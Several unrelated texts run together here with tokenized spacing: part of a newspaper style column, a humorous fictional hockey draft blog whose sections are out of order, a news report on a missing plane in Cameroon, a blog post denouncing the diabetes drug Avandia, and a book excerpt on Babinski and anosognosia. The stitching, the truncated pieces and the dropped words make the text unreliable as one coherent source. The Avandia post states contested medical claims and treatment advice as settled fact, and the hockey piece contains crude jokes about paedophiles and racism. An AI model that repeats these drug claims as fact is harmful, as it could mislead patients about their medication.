But even the most studious readers are likely to stumble over at least some of these words .
I do n’t suggest banning any of them — in some cases they may be the perfect choice , and we refuse to talk down to readers or dumb down our prose .
Still , we should remember that this is journalism , not philology .
Our readers , smart as they are , are often in a hurry .
They may be standing on the subway or skimming a story over breakfast .
Let ’s not make them work any harder than necessary .
In a Word
This week ’s grab bag of grammar , style and other missteps , compiled with help from colleagues and readers .
•••
All of which made her wonder why , with a fulsome résumé and a social calendar to match , she felt “ really unsettled in ways I could n’t acknowledge or even explain . ”
Best avoided .
The first definition of “ fulsome ” in our newsroom dictionary is “ disgusting or offensive , esp. because excessive or insincere [ fulsome praise ] . ”
While the secondary meaning “ full , ample ” has become more common , the ambiguity and negative connotation distract close readers .
“ Full , ” “ ample ” or perhaps “ impressive ” would have worked here .
•••
Mr. Conroy is appealing the conviction .
He testified that he lied to the police when he told them he stabbed Mr. Lucero because he wanted to protect another teenager , whom he said had confessed to him to stabbing Mr. Lucero .
Recorded announcement : Make it “ who . ”
•••
Michelle Obama on Thursday announced that five foundations — the Eli and Edythe Broad Foundation , the Omidyar Network , the Skoll Foundation , the Open Society Institute and the Benificus Foundation — would provide a total of $ 45 million to match the money the government plans to grant to nonprofit groups through its Social Innovation Fund , which will help expand social programs that have proven successful .
The Times ’s stylebook and the dictionary both prefer “ proved . ”
•••
Among those in the tense , packed courtroom gallery this week was the mother of one of the men who says Mr. Burge abused him .
Better : “ the mother of a man who says he was abused by Mr. Burge . ”
•••
While there is a numbing amount of ritual threats and counterthreats involved in any crisis with North Korea , there are several big differences between the current one and other confrontations over the past 20 years .
An awkward construction , partly because “ amount ” should be used with bulk quantities , not with separate , countable things .
•••
The prosecutor general , Abbas Jafari Dowlatabadi , announced on Tuesday that sentences had been “ finalized ” for 250 detained protesters , with nearly 11 of them sentenced to death — adding to the 9 political prisoners who have been executed since the protests broke out .
A strange lack of precision .

Bride and Groom Under the Shadow of the Israeli Apartheid Wall - " Wall Gate # 300 "
The Edmonton Oilers are kicking off the first ever Fictional Hockey Player Entry Draft with a huge dilemma – do they choose Adam Banks , the goal scoring centre from Minnesota , or Dean Youngblood , the slick winger raised on a farm outside Stanton .
This is a much cooler debate than Taylor vs .
Tyler , mainly because hearing the name Youngblood is super badass .
1. Edmonton Oilers
Adam Banks
Mighty Ducks / Team USA / Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
Banks is a safer bet for the Oilers because Youngblood ’s commitment to hockey is n’t as strong .
Youngblood briefly quit junior hockey during the middle of the playoffs because his friend was seriously injured .
Banks , on the other hand , famously said “ I just want to play hockey ” after being forced to leave the Hawks for the hapless Ducks .
With Edmonton ’s history of being burned by players it will be refreshing to have a player who is n’t concerned where he ’s playing .
This is n’t to say that Banks is a worse player .
He was a scoring machine in pewee hockey and starred for the Ducks during the Junior Goodwill Games .
Throughout Mighty Ducks 1 and 2 he scored a whopping ten goals and added one assist in nine games , while adding the championship winning shootout goal in the final against Iceland .
He was even selected for the varsity team as a freshman at the prestigious Eden Hall prep school .
Additionally , Banks is a tough player who has been constantly targeted by opponents because of his superior skill .
After receiving a vicious slash from Iceland ’s Olalf Sanderson in the final round robin game in the Junior Goodwill Games Banks suited up for a crucial quarter - final matchup against Germany .
It was n’t until Coach Bombay stopped sleeping with Iceland ’s women and actually took an interest in his team that Banks was pulled from the line - up for USA ’s semi-final matchup ( not without heavy protest of course ) .
The Maple Leafs have reportedly been working the phones feverishly for the past few days trying to work on a major deal and now Gary Bettman is walking to the podium amidst a chorus of boos .
He ’s announcing a trade !
Gary Bettman :
There is a trade to announce .
The Toronto Maple Leafs trade their 1st round pick in the 2012 NHL Entry draft to the Florida Panthers for the 3rd overall selection in the 2010 Fictional Hockey Player Entry Draft .
They then trade their 1st round pick in the 2013 NHL Entry Draft to the Columbus Blue Jackets for the 4th selection in the 2010 Fictional Hockey Player Entry Draft .
Holy shit !
The Leafs do n't have a first round pick until 2014 , but they now own three of the first four picks in this draft !
I ’m speechless .
Should I be happy or should I round - up all the booze in the house !?
2. Toronto Maple Leafs
Jeff Hanson
Charleston Chiefs ( from Slap Shot )
3. Toronto Maple Leafs ( from Florida Panthers )
Steve Hanson
Charleston Chiefs ( from Slap Shot )
4. Toronto Maple Leafs ( from Columbus Blue Jackets )
Jack Hanson
Charleston Chiefs ( from Slap Shot )
Yup , I 'm gathering the booze right now .
Brian Burke clearly was n’t satisfied with the level of truculence and pugnacity on the team last year and has boldly acquired the Hanson brothers to foil up and take on the league .
While these trades do n’t necessarily make the Leafs better , they will certainly make them a much scarier team to play against .
Burke is now being interviewed by James Duthie .
James Duthie :
This is your third major draft day trade , Brian , and I ca n’t help but wonder whether trading your real NHL draft picks for fictional ones is the best way of re-building your team .
Brian Burke : Listen , if I had to do this trade again today I would .
I believe in these players and as I ’ve said before , I ’m not interested in a five - year re-build .
... Draft Schmaft .
5. NYI
Dean Youngblood
Hamilton Mustangs ( from Youngblood )
Charles
Wang is practically crying at the podium as he announces Youngblood ’s name .
Youngblood was a potential first overall pick and now he falls to number five after Brian Burke loses his mind .
Youngblood is a left winger who should compliment John Tavares well .
He ’s a little small , standing at only 5 ’10 and weighing 160 lbs , but he ’s 17 and will fill out .
Regardless , he is a tough , feisty player who plays larger than his body , much like Doug Gilmour .
He came back to the ice after losing teeth from a wicked high stick from Carl Racki and later laid out Racki who falls short of only Ogie Ogilthorpe as the most notorious movie goon of all - time .
In only three junior playoff games Youngblood tallied five goals and one assist , despite being benched for most of the games because he was dating the coach ’s daughter .
That was stupid coaching because Youngblood once scored 92 goals and 125 assists for the Stanton Flyers before making the Hamilton Mustangs .
He ’s also a big - game player .
Youngblood scored a hat - trick in the Memorial Cup Final , one of which was the game tying goal with ten seconds left and another was the game winning goal scored on a penalty shot with three seconds left .
Money .
6. Tampa Bay
Gunnar Stahl
Team Iceland ( from Mighty Ducks 2 )
I would n’t be surprised if Gunnar Stahl was a distant relative of the Canadian Staal clan .
Stahl is unfairly categorized with the rest of Team Iceland as a goon , but he is just a very physical player who plays a pretty clean game .
In both games against the US he was a physical force and racked up four goals and one assist .
And that was against the eventual tournament winner .
He ended up leading the Junior Goodwill Games in scoring and terrorized the tournament .
Think of Stahl as a younger version of Peter Forsberg .
Gary Bettman :
There is a trade to announce .
The Carolina Hurricanes trade the 7th overall pick in the 2010 Fictional Hockey Player Entry Draft to the Vancouver Canucks for the 25th overall selection and a “ prescription for glaucoma ” from a “ reputable ” Vancouver doctor .
7. Vancouver ( from Carolina )
Charlie Conway
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
The Canucks clearly see their major flaw as leadership .
Roberto Luongo is uncomfortable with the captaincy and has even said he ’d prefer he was n’t the captain .
As a result , the Canucks are jumping up in the draft to select Captain Duck , Charlie Conway .
Some scouts thought Conway would fall further down the draft board after putting up a few statistically mediocre movies ( two goals and three assists in ten games in Mighty Ducks 1 and 2 ) , but the Canucks are n’t taking any chances .
Conway turned into an elite scorer in Mighty Ducks 3 potting three goals and one assist in two games , while at the same time learning the art of defence .
In addition , Conway truly learned what it takes to be a captain .
He now realizes it is n’t just a letter on the chest , but a burning dedication to the team .
Oh God , Pierre McGuire is here too .
Pierre McGuire : Get ready Vancouver fans for this pleasant young man out of Minneapolis , Minnesota .
He 's the real deal .
Charlie Conway is the next Trevor Linden .
8. Atlanta
Olalf Sanderson
Team Iceland ( from Mighty Ducks 2 )
Sanderson is easily the dirtiest player whose name is n’t Racki or Ogilthorpe .
He viciously slashes Banks ’ wrist and is constantly taking runs at opponents .
However , he does have some skill ( unless you think he 's riding the coat tails of Gunnar Stahl ) .
In two games against the US he scored two goals and added three assists , plus a shootout goal .
Sanderson will definitely get called for more penalties in the NHL , but he should also score his fair share of goals .
Atlanta hopes that Sanderson develops into someone akin to Dino Ciccarelli .
9. Minnesota
Guy Germaine
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
The Wild are going with the hometown boy with this pick - always a fan - friendly move .
Germaine is the most underrated player of the Mighty Ducks movies .
He is the most physical player in the first movie , but does n’t receive as much attention for this in D2 because the Bash Brothers hot dog after every hit they throw .
I ’m sorry guys , but Germany is probably on a breakaway now because you ’re both chest bumping in front of the bench .
Germaine also tallied a respectable 2 goals and 4 assists in ten games in D1 and D2 , including a shoot - out goal in the final against Iceland .
He is also tremendously respected by his teammates .
In the final against the Hawks in D1 , the Ducks , even Conway , choose Guy to take the deciding penalty shot .
It ’s only on the hunch of Bombay that Charlie gets a chance .
Or maybe it was because Bombay was banging Charlie ’s Mom and had to make her happy .
10 . NYR
Fulton Reed
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
The Rangers are hoping that Reed is the second coming of Al MacInnins .
That might be a stretch considering Mac could actually play defence .
Reed routinely leads himself out of position with thundering bodychecks and instead of skating hard to get back in the play he hot dogs it for the crowd .
Dummy .
But his shot is a rocket and will immediately improve the New York power - play .
11 . Dallas
Ned Braden
Charleston Chiefs ( from Slap Shot )
Braden is the most talented player in the Federal League , which is sort of like saying you 're the hottest girl in the faculty of engineering .
He led the league in scoring , which is nice , except the Federal League is full of goons , so it is n’t exactly impressive .
Hopefully Braden does n't feel good about this like Brent Gretzky is of the 128 points he scored in 1999 - 2000 for the Asheville Smoke of the UHL .
Braden steadily refuses to engage in any goonery even amidst benching .
He would rather strip in front of an entire arena than play physically .
Although , he did punch out his coach , so he can be coerced .
He 's an enigma to say the least .
12 . Anaheim
Connie Moreau
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
There ’s no way the Ducks could pass up on one of their own .
They will even gain some publicity for being the first NHL team to draft a female player .
Moreau puts up two goals and four assists over the first two Mighty Ducks , but will be best remembered as being saved by Cowboy Dwayne with a lasso because she could n’t dig the puck out of the corner … while no one was around … while the puck was just lying against the boards .
Come on , Connie !
Two women were just inducted into the Hockey Hall of Fame ; you ’re making your entire gender look bad !
13 . Calgary
Julie Gaffney
Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 2 - 3 )
Julie “ the Cat ” Gaffney did n’t receive much playing time from Coach Bombay during the Junior Goodwill Games , despite clearly being a better goalie than incumbent Greg Goldberg .
There must have been some sort of sexual favours being exchanged , otherwise Goldberg had no place in the net .
This is surely true because Goldberg quickly loses the starting job at Eden Hall to Gaffney .
It ’s might seem strange that the Flames choose a goalie since they already have an All - Star in net , but Gaffney has a great glove and has shown the ability to come into a game cold and stone the opposition – even in a shoot - out .
The Flames are one of the worst shoot - out teams in the league and are willing to remove Kipper every time the game goes that deep .
14 . St Louis
Derek Sutton ( SWAYZE ! )
Hamilton Mustangs ( from Youngblood )
If Sutton was healthy he would be in the running for the first overall draft choice .
Some scouts even think he ’s in a category alone and there would n’t even be a discussion as to who is the best player available .
So , if Sutton is so good why did he fall so far ?
Well , it ’s unknown whether he can ever play hockey again .
He suffered a terrible head injury when his head hit the ice after being blindsided by Carl Racki .
The extent of the damage is n’t known , mainly because Thunder Bay in the 1980s could n’t afford to provide a CAT scan .
Not too sure if Thunder Bay in 2010 has that sort of technological capability .
Some medical personnel fear Sutton might have brain damage .
The Blues are clearly taking a risk here ( but if you do n’t take a risk in a fictional hockey draft then when do you take a risk ? ) , but Sutton ’s numbers before his injury make it worth it .
Sutton was in his fourth year of Junior A as the captain of the Hamilton Mustangs and already scored 91 goals before Dean Youngblood joined the team .
He plays a physical style , but can also thread passes through the defence or hammer home goals of his own .
With his combination of skills and head injuries it ’s clear that Sutton most closely resembles Eric Lindros .
15 . Boston
Luis Mendoza
Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 2 - 3 )
The Bruins desperately need a natural winger to go along with their copious amounts of centremen .
Mendoza is the fastest player in the draft and could become the fastest player in the entire NHL .
Unfortunately , he still has trouble stopping , a rudimentary skill that could n’t be taught by Coach Bombay , which says a lot about what Bombay was doing all of D2 .
Mendoza is somewhat of a sexual predator in D3 and the Bruins should be wary of letting him out on the town unaccompanied .
Although , his company must not run interference on anyone while Luis shows a young woman where the bathroom is .
16 . Ottawa
Ogie Ogilthorpe
Syracuse Bulldogs ( from Slap Shot )
The Senators are definitely tired of having Colton Orr maim Matt Carkner and decide to bring in the most notorious goon of the Federal League .
Ogilthorpe is one of the most infamous enforcers to ever disgrace a hockey rink .
The Senators are clearly taking a risk with Ogilthorpe considering he was once deported to Canada , but the country refused to accept him back .
There might be some VISA problems here .
17 . Colorado
Dwayne Robertson
Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 2 - 3 )
Don Hendrix , owner of Hendrix Hockey , described Robertson as the best puckhandler he has ever seen .
In fact , Robertson ’s puckhandling is so good he rarely gives up the puck … which includes passing and even shooting considering he only scored once in both movies .
He ’s also a bit of a head case .
He not only brings his cowboy hat and lasso to every practice , but he brings them to the bench every game and occasionally uses them to rodeo his opponents .
Gary Bettman :
There is a trade to announce .
The Nashville Predators trade the 18th overall pick in the Fictional Hockey Player Entry Draft to the Washington Capitals for the 26th overall pick and all five seasons of the Wire on DVD .
18 . Washington ( from Nashville )
Reg Dunlop
Charleston Chiefs ( from Slap Shot )
It ’s doubtful that Dunlop has more than one more year of hockey left in his body , but the Capitals need his veteran presence after their epic collapse against the Canadiens in the playoffs .
And Reg Dunlop is the definition of a savvy vet .
Dunlop is a master tactician and manipulator , always able to get the most out of his players , even with limited skill .
Not a scorer ?
Do n’t worry , Reg will make you think you ’re a fighter .
And he ’ll make it work , too .
The Capitals need to find a way to motivate their superstars in the playoffs and they need someone to convince them that playing physically is the actual way to win .
Dunlop will do whatever it takes , even if it means pushing a teammate ’s marriage to the brink and then sleeping with his teammate ’s wife .

Two words , KNUCKLE PUCK .
20 . Pittsburgh
John Biebe ( ya , that ’s Russell Crowe in Mystery , Alaksa , which I saw in theatres )
Mystery ( from Mystery , Alaska )
If Biebe hangs out around Sidney Crosby long enough then maybe his beard growing abilities will wear off on Sid .
It ’s worth a shot .
Sid ca n’t drive a van during playoff time for his uncanny resemblance to every paedophile in the world .
What ?
Russell Crowe does n't have a beard in that movie ?
Well , I could n't bring myself to go back and watch Mystery , Alaska , so you 'll have to suspend your disbelief momentarily .
21 . Detroit
Jesse Hall
Mighty Ducks / Team USA ( from the Mighty Ducks 1 - 2 )
If the Red Wings want to draft Hall they will have to find him first .
He disappears without any explanation in D3 , which can only lead me to assume that Eden Hall was super racist and did n’t want to let in two black people .
Internet conspiracy theories suggest Disney already had Goodburger fill the role of Token Black Kid , so Hall was obsolete , except to believe that we ’d have to ignore the fact that there were two black players on the Ducks in both the first and second movie .
Hall is one of the players chosen to shoot for USA in the shoot - out against Iceland , which means he has some skill , but his personality is what is scaring most teams .
He ’s openly racist , calling every white person a cake eater , and constantly bristles with Coach Bombay and teammates .
He ’s also easy to rattle .
He tried to jump into the crowd and fight Goodburger after being taunted mercilessly by the jester .
Maybe there ’s more than just Disney racism that caused Hall to lose his spot on the team .

Jack the Monkey
From MVP : Most Valuable Primate
After their most successful season in the desert , the Coyotes seem desperate to keep the fans coming out to the arena after everyone eventually forgets about playoff hockey .
Drafting a three - year - old chimpanzee is bizarre , but when you ’re trying to sell a sport on ice to a bunch of people in a desert you ’re willing to try anything .
23 . Buffalo
Greg Goldberg
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 1 - 3 )
Clearly , the Sabres do n’t need a starting goalie considering Ryan Miller just won the Vezina Trophy .
That ’s good , because Goldberg is far from a starting goalie .
He was originally afraid of being hit with the puck and I do n’t think he ’s over that fear because he did n’t make any saves that he actually had to move his body for .
So , he ’s a goalie that is out of shape , ca n’t stop a puck , and rips farts that no one can stand .
He ’s immediately better than Patrick Lalime .
24 . New Jersey
Dave “ Killer ” Carlson
Charleston Chiefs ( from Slap Shot )
The Devils have n’t had a tough defenceman since Scott Stevens retired .
Carlson wo n’t confuse anyone with Stevens , but he tries his hardest each game and is willing to do whatever the coach says in order to win .
He sticks up for his teammates and is willing to take up a bounty on a man ’s head .
Gritty .
25 . Carolina ( from Vancouver )
Ken Wu
Team USA / Junior Varsity Eden Hall Warriors ( from the Mighty Ducks 2 - 3 )
Wu Wu , Kenny Wu .
He ’s actually the third figure skater to ever play for the Mighty Ducks .
He ’s small , shifty , and confuses his opponents while he spins in circles during the middle of the game .
He ’s basically an Asian Sergei Samsonov .
The only difference is he ’s actually willing to involve himself physically , which made him the third Bash Brother .
Gary Bettman :
There is a trade to announce .
The Nashville Predators trade the 26th overall pick in the 2010 Fictional Hockey Player Entry Draft to the Montreal Canadiens for a lifetime membership to Club Super Sex and the rights to Carey Price ’s drug dealer .
26 . Montreal ( from Nashville from Washington )
Gordon Bombay
Mighty Ducks / Team USA ( from the Mighty Ducks 1 - 3 )
Bombay scored 198 goals in a single peewee season and was on a somewhat circuitous route to the NHL before incurring a devastating knee injury while playing in the minors .
Hab fans hoping that Bombay will suit up for the Canadiens will probably be disappointed ( although Bombay ’s impeding limp mysteriously disappears after one day in D2 , so there might be hope ) .
It ’s possible that the Canadiens are actually grooming Bombay to take over the head coaching position .
Who would n’t want the Minnesota Miracle Man coaching their team !?
Let ’s look at Bombay ’s coaching highlights : endangers children ’s lives by driving a limo on a frozen pond ; bangs Charlie Conway ’s Mom ; teaches the kids how to dive ( wo n’t need to teach any Habs this trick ) ; alienates the team ’s black players ; does n’t conduct one legitimate practice ; bangs Iceland chick while telling her team game plan ; abandons the team almost forcing them to forfeit ; continues to play Goldberg despite his shittiness ; lets Banks play through hurt wrist in quarter - final before taking him out of the semi-final ; and FINALLY , he ’s prepared to let Adam Banks , the team ’s best player , sit out the Final in favour of some kid who walked on the team a day before .
He ’s also a heavy drinker , so not only is he perfect for the Montreal party scene , but he ’s a huge upgrade over Jacques Martin .
27 . Montreal
Denis Lemiuex
Charleston Chiefs ( from Slap Shot )
The Montreal Canadiens only have three French - Canadian players , unless you count Benoit Pouliot ( who is actually from Alfred , Ontario ) , which makes four .
What ’s worse , not only are French - Canadian goalies a dying breed in general , but they have n’t had one since Jose Theodore was run out - of - town in 2006 .
That 's a travesty .
This is clearly a problem for a franchise that has a rich tradition of French - Canadian goalies that includes Patrick Roy , Jacques Plante , and Georges Vezina .
With Lemiuex backing up Carey Price there will be no question which goalie will start , which should please Price .
Lemiuex also conducts excellent interviews and should keep the press from plaguing Carey Price with daily questions about his rampant party life .
28 . San Jose
Heaver
Hamilton Mustangs ( from Youngblood )
Heaver is another French - Canadian goalie , which means he ’s good since Youngblood was made in the 1980s when French - Canadian goaltending was still the envy of the world .
The Sharks think Heaver can become an elite goalie in the NHL .
If Keanu Reeves is so fast that he can dodge multiple bullets then he must be fast enough to stop a couple dozen hockey pucks a game .
29 . Philadelphia
Dean Portman
Team USA / Junior Varsity Eden Hall Warriors ( from Mighty Ducks 2 - 3 )
Not much left at this point , so the Flyers are taking the second half of the Bash Brothers to fit their image as the Broad Street Bullies .
Portman will never be mistaken for a scoring threat , but he brings energy to the team and could create the second coming of the Bash Brothers with Daniel Carcillo .
30 . Chicago
Lester Averman
Mighty Ducks / Team USA / Junior Varsity Eden Hall Warriors ( from Mighty Ducks 1 - 3 )
The Blackhawks are easily the yappiest team in the league with the likes of Patrick Sharp , Kris Versteeg , and Adam Burish .
Although cap constrictions might mean one of these players is gone .
As a result they need a good character player to do running commentary as he rides the bench and talk smack to the other team .
Averman ’s mouth runs for the entire Mighty Ducks series , yet he still manages to tally 7 points in 13 games , which means he ’s immediately better than Adam Burish .
﻿ That 's it !
Thanks TSN3 , that was thoroughly fun .
Maybe we can do this again in 10 years after they reboot the Mighty Ducks franchise .
I ’m totally unconcerned with tonight ’s NHL entry draft .
Why ?
If you did n’t know , the Leafs made a somewhat controversial trade that removed them from not only the first two rounds of this year ’s draft , but the first round of next year ’s draft as well .
Watching Boston go up to the podium to pick second is n’t what I call enjoyable television .
But there is a draft that I am very interested in .
It did not receive much hype , so not many people knew about it .
That ’s what happens when your league does n’t have a major TV deal in place .
This past weekend I watched the most riveting live draft that I ’ve ever seen .
You may not have caught it since not many people subscribe to TSN3 .
The draft in question is none other than the 2010 Fictional Hockey Player Entry Draft ( you read that correctly ) .
Toronto may have traded their 2010 and 2011 first round picks in the NHL Entry Draft , but they still have their first round pick for the 2010 Fictional Hockey Player Entry Draft .
The draft order was determined in the same way the normal draft was .
That means Toronto held the second overall pick .
Here ’s a running diary of the madness that ensued .

Six Australian mining executives , including billionaire magnate Ken Talbot , are on board a plane that has gone missing in the African nation of Cameroon .
The executives are from the Western Australian - based iron ore company Sundance Resources .
A statement from Sundance says the chartered plane , carrying nine people in total , was reported missing after it failed to reach its destination on Saturday .
Foreign Minister Stephen Smith says the flight should have taken about an hour in duration and he has grave concerns for the passengers .
" We are very concerned about the safety and wellbeing of six Australians and we will await the outcome of the search , " he said .
" In the meantime , we will continue to give consular assistance to the company and to the family members . "
Sundance says an international air and ground search which has been launched .
Billionaire Ken Talbot , a non-executive director of Sundance , was the founder of Queensland - based Macarthur Coal , but sold his stake two years ago .
He was due to face trial in Brisbane in August on 35 charges of paying secret commissions to former state government minister Gordon Nuttall between 2002 and 2005 .
Others on board the plane include Sundance chairman Geoff Wedlock , managing director and CEO Don Lewis , company secretary John Carr - Gregg and non-executive directors John Jones and Craig Oliver .
A statement from Sundance says the mining executives were visiting the company 's iron ore project in Cameroon and Congo .
" The families of the missing have been notified and are being supported during this deeply distressing time , " it said .
Sundance says an extensive search is now underway .
" A comprehensive air and ground search will commence at first daylight local time on Sunday ( approx 3.30 pm AEST ) . "
" A Congolese aircraft will be involved in the search . "
The company promised a further update as more information became available says it is coordinating with government authorities in Cameroon and Congo , as well as with Department of Foreign Affairs representatives in the region to locate the aircraft .
DFAT says the high commissioner to Abuja is in Cameroon managing the government 's response on the ground .
Two other officials will also travel to Cameroon .
Sundance 's chief focus is its Mbalam ore project in Cameroon which is potentially worth billions over its lifetime .
The company said it would ask the ASX to put the company 's securities into a trading halt prior to the open of trade on Monday .
- ABC/AAP
70 ( 80 % ) patients in the treatment group regressed to normal glucose tolerance compared with 52 ( 53 % ) in the placebo group ( p=0·0002 ) .
any
The change in β- cell function , as measured by the insulin secretion - sensitivity index - 2 , did not differ between groups ( placebo − 252·3 , −382·2 to − 58·0 vs rosiglitazone and metformin − 221·8 , −330·4 to − 87·8 ; p=0·28 )
The slimy weasels who profit from selling the dangerous drug Avandia do n't give up easily .
Though there is incontrovertible evidence that their drug causes heart failure in people who did not have it before starting the drug , as well as ostoporosis and an increased risk of heart attack , they keep sending the health media carefully doctored press releases touting new and marvelous features of their drug .
The latest is the claim that Avandia does a humdinger of a job at preventing diabetes , reducing it by two thirds .
The study is a triumph of sleazy research technique , but because the drug reps will be hard at work " teaching " your doctor of this wonderful new feature of their dreadful drug , you need to understand what the study actually did and what it learned .
The study abstract can be found here : Low - dose combination therapy with rosiglitazone and metformin to prevent type 2 diabetes mellitus ( CANOE trial ) : a double - blind randomised controlled study .
Prof Bernard Zinman ..
June 3 , doi:10.1016/S0140-6736(10)60746-5As you can see by looking at the title , this study combined Avandia with Metformin .
Because we know that Metformin delays the diagnosis of Type 2 diabetes ( by lowering blood sugar , not by correcting underlying flaws ) you 'd assume that any trial of metformin with another added drug would compare the combination with metformin alone .
But since the point of this study was to breath life into the decaying corpse of Avandia , that comparison was omitted .
There are only two groups in this study , those on the Avandia metformin combo and those on a placebo .
Beyond that , the study involved only about 200 people , divided into two groups .
This means that if one out of every two hundred people taking Avandia developed a severe or even fatal complication , the study group is too small to detect it .
Since the problem with Avandia is that it has been shown in large studies to cause severe and sometimes fatal complications the study design used here is worthless and very clearly designed only to squeeze more profit out of GlaxoSmithKline 's dangerous drug .
The next problem with the study is that it lasted only a median of 3.4 years .
Why is this a problem ?
Because even if the study size had been big enough to make the severe side effects evident , the most serious of the Avandia side effects may take up to a decade to become evident .
That is because Avandia works by transforming bone stem cells into baby fat cells into which glucose gets pushed .
( That is why Avandia causes permanent weight gain . )
This means that over time bones are weakened because they do n't get new bone cells coming in to reinforce them .
Eventually they start to crack and by then it is too late to fix the problem .
But you wo n't see this effect over 4 years .
So again , this study was designed to avoid highlighting adamaging side effect of Avandia .
But setting aside the fact that it is impossible to know from this study whether Avandia is safe in this context , the actual finding of the study was another blow to Avandia 's claims , and makes it crystal clear why there was no " metformin only " group included in the study -- though you would n't know this from the press coverage .
The study claims , Note that the study is reported as claiming that two thirds of those who took Avandia ( with metformin , though the headlines miss that ) did not progress to diabetes .
But at the same time , more than one half of those who did not takedrug also reverted to normal blood sugar status .
So in fact , the drug combo only kept an additional 27 % of participants from being diagnosed with diabetic blood sugars .
Note that DPPT - - a far more robust study of 3234 people with pre-diabetes found that Metformindecreased the progression to diabetes by 31 % over an average of 2.8 years .
Volume 346:393-403 , February 7 , 2002 , Number 6So there is basicallyeven allowing for the extra couple months in the Avandia study .
All this seems to have eluded the peer reviewers who approved this study for publication .
Okay , that 's bad enough , but there 's one last point .
The makers of Avandia promote it to doctors with the claim -- unsupported by evidence -- that members of the TZD drug class to which it belongs rejuvenate beta function .
This study , like every other study of the subject finds that is n't true .
Thestudy states , So the improvement achieved in the drug group ( most likely from taking the metformin ) did not occur because the beta cells were functioning better , but only because blood sugar was lowered .
Whether this was because the metformin blocked liver dumps , or because it promoted glucose uptake at the muscles by revving up AMP - Kinase , or because Avandia pushed excess glucose into brand new baby fat cells is unknown .
So that 's the story that the folks atsomehow missed .
And because they missed it , you can be sure some percentage of boneheaded doctors will read this new study and put patients who do n't have diabetes on Avandia .
After all , why prescribe an effective , safe , generic drug that can be bought for $ 4 a month -- Metformin - - when you can prescribe one that does nothing but harm and costs up to $ 100 a month ?
The answer has a lot to do with the subtle incentives drug companies still provide doctors , but that 's the subject for another blog post .
Unfortunately , even doctors who are gun shy about Avandia still believe that its evil twin Actos is safe .
It is n't .
Actos also causes heart failure and works by changing bone baby cells into baby fat cells causing permanent weight gain and , long term , damaged and broken bones .
Actos may not cause heart attack , but that information wo n't mean much if you develop heart failure , which over time is just as fatal .
It 's also worth notingwhich means that if you are particularly unlucky , both Avandia and Actos can seriously damage your vision .
Bottom line :
If you have pre-diabetes can't get your blood sugar back to normal by cutting carbs ( which has been proven far more effective than any drug ) stick with metformin .
It 's safe , it works , andside effects include things like weightand a lower incidence of cancer .

2. The Illness of Doubt :
Everyone Poisons Himself in His Own Way
Courtesy of the Clendening History of Medicine Library , University of Kansas Medical Center
June 11 , 1914 .
In a brief communication presented to the Neurological Society of Paris , Joseph Babinski ( 1857-1932 ) , a prominent French - Polish neurologist , former student of Charcot and contemporary of Freud , described two patients with “ left severe hemiplegia ” – a complete paralysis of the left side of the body – left side of the face , left side of the trunk , left leg , left foot .
Plus , an extraordinary detail .
These patients did n’t know they were paralyzed .
To describe their condition , Babinski coined the term anosognosia – taken from the Greek agnosia , lack of knowledge , and nosos , disease . [ 13 ]
I want to draw attention to a mental disorder that I had the opportunity to observe in cerebral hemiplegia , which consists in the fact that patients seem unaware of or ignore the existence of their paralysis . . . .
One such patient . . . hit by left hemiplegia has largely maintained her intellectual and affective faculties , for many months .
She remembered past events well , was willing to talk , expressed herself correctly , her ideas were sensible ; she was interested in persons known to her and asked about new people . . .
No hallucinations , delirium , confusional state , confabulation .
What did contrast with the apparent preservation of intelligence of this patient was that she seemed to ignore the existence of a nearly complete hemiplegia , which she had been afraid of for many years .
Never did she complain about it ; never did she even allude to it .
If she was asked to move her right arm , she immediately executed the command .
If she was asked to move the left one , she stayed still , silent , and behaved as if the question had been put to somebody else .
Jubilotheque ( UPMC Paris )
There were many unanswered questions in Babinski ’s original paper .
Did the anosognosic patient have absolutely no knowledge or some limited knowledge of her left - side paralysis ?
Was there a blocked pathway in the brain ?
Was the anosognosia an organic ( or somatic ) disease ?
Or a derangement of thought ?
Was she in some sort of trance ?
Babinski also noted that many of his anosognosic patients developed odd rationalizations .
When he asked them to move their left ( paralyzed ) arms , they would decline to do so , offering a myriad of implausible excuses .
( Furthermore , not all of his patients with left - side paralysis were clueless about their condition .
Some patients had knowledge of their paralysis but were oddly indifferent to it .
For these patients , Babinski coined the term anosodiaphoria , or indifference to paralysis [ 14 ] . )
Babinski was focused on one central question .
Do we have to admit . . . that anosognosia is real ?
I am not able to state this , and it has been impossible for me to interrogate the patients in a sufficient way to be sure about this point . . . [ 15 ]
Jubilotheque ( UPMC Paris )
Is it real ?
What is Babinski asking ?
Is it organic , a pathology of the brain ?
Is it psychological ?
Moreover , is it feigned ? [ 16 ]
We have been abandoned in a hall of mirrors .
The disease that calls into question our connection to reality may itself be an illusion .
The contemplation of anosognosia leads to many questions about how the brain puts together a picture of reality and a conception of “ the self . ”
It also suggests that our conception of reality is malleable ; that it is possible to not - know something that should be eminently knowable . [ 17 ]
It may also suggest that it is possible to know and not - know something at the same time .
But additionally , it puts the question of how we “ know ” things at the heart of a neurological diagnosis , and raises questions about how we separate the physical from the mental .
The Babinski Sign , the most famous of his discoveries , is a straightforward attempt to reveal the existence of an underlying pathology ( damage to the spinal cord or brain ) from a simple objective test .
U.S. Army Field Guide
The key is the flexation of the big toe .
Stroke the sole of the foot .
Does the big toe flex up or down ?
Up — not so good ; down — pretty much O.K .
And you do n’t have to ask the patient , “ How are you feeling ? ”
Babinski ’s central concern was the black box of the mind and of the brain .
How can we tell what is going on inside of us ?
Or anybody else , for that matter ?
Babinski ( as well as Freud ) was a student of Charcot , who held the first chair of neurology at the Salpêtrière , a massive Parisian hospital complex and the center of French neurological science by the end of the 19th century .
Charcot ’s main focus was on hysteria , a vaguely defined disease that he believed could be tracked back to an organic defect of the nervous system — a brain tumor or spinal lesion . [ 18 ]
